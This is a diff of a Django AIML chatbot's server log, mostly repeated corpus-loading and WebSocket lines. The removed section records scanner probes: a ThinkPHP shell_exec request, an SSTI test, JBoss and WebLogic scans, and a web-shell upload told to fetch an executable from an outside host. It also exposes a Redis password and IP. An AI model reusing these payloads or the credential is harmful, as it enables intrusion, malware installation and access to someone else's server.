+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1928 - - [26/Mar/2019:13:29:20] "WSDISCONNECT /robot/982190.536964935023311/" - -
+112.10.182.189:1935 - - [26/Mar/2019:13:29:20] "WSCONNECTING /robot/203300.832610802512705/" - -
+112.10.182.189:1935 - - [26/Mar/2019:13:29:20] "WSCONNECT /robot/203300.832610802512705/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1935 - - [26/Mar/2019:13:29:33] "WSDISCONNECT /robot/203300.832610802512705/" - -
+112.10.182.189:1962 - - [26/Mar/2019:13:29:42] "WSCONNECTING /robot/481600.3429291217719699/" - -
+112.10.182.189:1962 - - [26/Mar/2019:13:29:42] "WSCONNECT /robot/481600.3429291217719699/" - -
 Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
@@ -46,47 +661,389 @@ Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-112.10.183.66:4895 - - [23/Mar/2019:03:19:08] "WSDISCONNECT /ws/chat/264480.007834873896237715/" - -
-87.120.36.80:26764 - - [23/Mar/2019:11:13:44] "GET /" 200 11772
-87.120.36.80:27368 - - [23/Mar/2019:11:13:45] "GET /" 200 11772
-87.120.36.80:28540 - - [23/Mar/2019:11:13:46] "GET /login" 404 1121
-87.120.36.80:29220 - - [23/Mar/2019:11:13:47] "GET /customers/1" 404 1121
-87.120.36.80:29872 - - [23/Mar/2019:11:13:47] "GET /gs-guide-websocket/803/a8vbaovq/htmlfile?c=_jp.local" 404 1121
-87.120.36.80:30364 - - [23/Mar/2019:11:13:48] "GET /console/login/LoginForm.jsp" 404 1121
-87.120.36.80:31018 - - [23/Mar/2019:11:13:48] "POST /index.php?s=captcha" 404 1121
-87.120.36.80:31800 - - [23/Mar/2019:11:13:49] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=netstat%20-an" 404 1121
-87.120.36.80:32586 - - [23/Mar/2019:11:13:49] "POST /website/blog/" 404 1121
-87.120.36.80:33212 - - [23/Mar/2019:11:13:50] "GET /core/install.php?rewrite=ok&langcode=en" 404 1121
-87.120.36.80:33960 - - [23/Mar/2019:11:13:50] "POST /RPC2" 404 1121
-87.120.36.80:34724 - - [23/Mar/2019:11:13:51] "GET /users" 404 1121
-87.120.36.80:35568 - - [23/Mar/2019:11:13:51] "POST /flex2gateway/amf" 404 1121
-87.120.36.80:36186 - - [23/Mar/2019:11:13:52] "GET /?name={{233*233}}" 200 11772
-87.120.36.80:36906 - - [23/Mar/2019:11:13:52] "GET /ws_utc/resources/setting/options/general" 404 1121
-87.120.36.80:37730 - - [23/Mar/2019:11:13:53] "GET /orders.xhtml" 404 1121
-87.120.36.80:38254 - - [23/Mar/2019:11:13:53] "GET /struts2-showcase" 404 1121
-87.120.36.80:38664 - - [23/Mar/2019:11:13:54] "GET /invoker/JMXInvokerServlet" 404 1121
-87.120.36.80:39292 - - [23/Mar/2019:11:13:54] "GET /invoker/readonly" 404 1121
-87.120.36.80:39880 - - [23/Mar/2019:11:13:55] "GET /jmx-console/HtmlAdaptor" 404 1121
-87.120.36.80:40522 - - [23/Mar/2019:11:13:55] "GET /manager/html" 404 1121
-87.120.36.80:41368 - - [23/Mar/2019:11:13:56] "GET /wls-wsat/CoordinatorPortType" 404 1121
-87.120.36.80:42222 - - [23/Mar/2019:11:13:56] "PUT /ddd.jsp/" 404 1121
-87.120.36.80:42738 - - [23/Mar/2019:11:13:57] "GET /ddd.jsp" 404 1121
-119.29.203.241:59554 - - [23/Mar/2019:22:39:45] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
-119.29.203.241:59554 - - [23/Mar/2019:22:39:45] "GET /index.action" 404 1121
-119.29.203.241:59554 - - [23/Mar/2019:22:39:45] "GET /index.do" 404 1121
-119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "PUT /FxCodeShell.jsp%20" 404 1121
-119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "PUT /FxCodeShell.jsp::$DATA" 404 1121
-119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "PUT /FxCodeShell.jsp/" 404 1121
-119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
-119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "PUT /FxCodeShell.jsp%20" 404 1121
-119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "PUT /FxCodeShell.jsp::$DATA" 404 1121
-119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "PUT /FxCodeShell.jsp/" 404 1121
-119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
-183.57.54.43:60507 - - [24/Mar/2019:19:55:36] "GET /" 200 11772
-183.57.54.43:60958 - - [24/Mar/2019:19:55:36] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak" 404 1121
-120.199.34.100:61697 - - [25/Mar/2019:04:41:53] "WSCONNECTING /ws/chat/007920.2573448321966376/" - -
-RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
-120.199.34.100:61697 - - [25/Mar/2019:04:41:53] "WSCONNECT /ws/chat/007920.2573448321966376/" - -
+112.10.182.189:1962 - - [26/Mar/2019:13:31:58] "WSDISCONNECT /robot/481600.3429291217719699/" - -
+112.10.182.189:2008 - - [26/Mar/2019:13:31:59] "WSCONNECTING /robot/780940.8422600423273698/" - -
+112.10.182.189:2008 - - [26/Mar/2019:13:31:59] "WSCONNECT /robot/780940.8422600423273698/" - -
 Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...2019-03-25 04:47:22,925 WARNING  Not Found: //wls-wsat/CoordinatorPortType
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:2008 - - [26/Mar/2019:13:37:05] "WSDISCONNECT /robot/780940.8422600423273698/" - -
+112.10.182.189:1087 - - [26/Mar/2019:13:37:05] "WSCONNECTING /robot/811430.30995456399235954/" - -
+112.10.182.189:1087 - - [26/Mar/2019:13:37:05] "WSCONNECT /robot/811430.30995456399235954/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1087 - - [26/Mar/2019:13:38:45] "WSDISCONNECT /robot/811430.30995456399235954/" - -
+112.10.182.189:1125 - - [26/Mar/2019:13:38:46] "WSCONNECTING /robot/619170.13765582913369578/" - -
+112.10.182.189:1125 - - [26/Mar/2019:13:38:46] "WSCONNECT /robot/619170.13765582913369578/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1125 - - [26/Mar/2019:13:41:22] "WSDISCONNECT /robot/619170.13765582913369578/" - -
+112.10.182.189:1206 - - [26/Mar/2019:13:41:23] "WSCONNECTING /robot/707130.6389748938869719/" - -
+112.10.182.189:1206 - - [26/Mar/2019:13:41:23] "WSCONNECT /robot/707130.6389748938869719/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1206 - - [26/Mar/2019:13:41:47] "WSDISCONNECT /robot/707130.6389748938869719/" - -
+112.10.182.189:1240 - - [26/Mar/2019:13:41:51] "WSCONNECTING /robot/534590.5845624140632908/" - -
+112.10.182.189:1240 - - [26/Mar/2019:13:41:51] "WSCONNECT /robot/534590.5845624140632908/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1240 - - [26/Mar/2019:13:43:42] "WSDISCONNECT /robot/534590.5845624140632908/" - -
+112.10.182.189:1302 - - [26/Mar/2019:13:43:43] "WSCONNECTING /robot/569440.46765344875461734/" - -
+112.10.182.189:1302 - - [26/Mar/2019:13:43:43] "WSCONNECT /robot/569440.46765344875461734/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1302 - - [26/Mar/2019:13:44:29] "WSDISCONNECT /robot/569440.46765344875461734/" - -
+112.10.182.189:1328 - - [26/Mar/2019:13:44:29] "WSCONNECTING /robot/704860.6514351151325228/" - -
+112.10.182.189:1328 - - [26/Mar/2019:13:44:29] "WSCONNECT /robot/704860.6514351151325228/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.05 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...Not Found: /favicon.ico
+2019-03-26 14:25:28,197 WARNING  Not Found: /favicon.ico
+done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1328 - - [26/Mar/2019:13:45:09] "WSDISCONNECT /robot/704860.6514351151325228/" - -
+112.10.182.189:1369 - - [26/Mar/2019:13:45:19] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1369 - - [26/Mar/2019:13:45:19] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1369 - - [26/Mar/2019:13:54:36] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1621 - - [26/Mar/2019:13:54:36] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1621 - - [26/Mar/2019:13:54:36] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
